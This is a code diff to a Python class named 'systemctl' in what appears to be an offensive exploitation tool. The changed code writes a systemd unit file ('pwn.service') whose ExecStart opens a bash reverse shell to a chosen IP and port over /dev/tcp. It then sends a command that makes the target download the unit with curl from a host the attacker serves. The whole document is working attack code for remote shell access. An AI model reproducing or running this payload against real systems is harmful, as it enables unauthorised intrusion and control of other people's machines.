@@ -13,19 +13,16 @@ import time
 
 
 class systemctl:
-    def __init__(self, socks, ip, port, re_ip, re_port):
-        self.payload = f'''
+    def exploit(self, socks, ip, port, re_ip, re_port):
+        payload = f'''
 [Service]
 Type=oneshot
 ExecStart=/bin/bash -c '/bin/bash -i >&/dev/tcp/{re_ip}/{re_port} 0>&1'
 [Install]
 WantedBy=multi-user.target
         '''
-        self.__exploit(socks, ip, port, re_ip, re_port)
-        
-    def __exploit(self, socks, ip, port, re_ip, re_port):
         with open('./plugin/pwn.service','w')as f:
-            f.write(self.payload)
+            f.write(payload)
         time.sleep(2) 
         core.send_command(socks, f"curl http://{ip}:{port}/plugin/pwn.service >/tmp/pwn.service ")
         time.sleep(10)
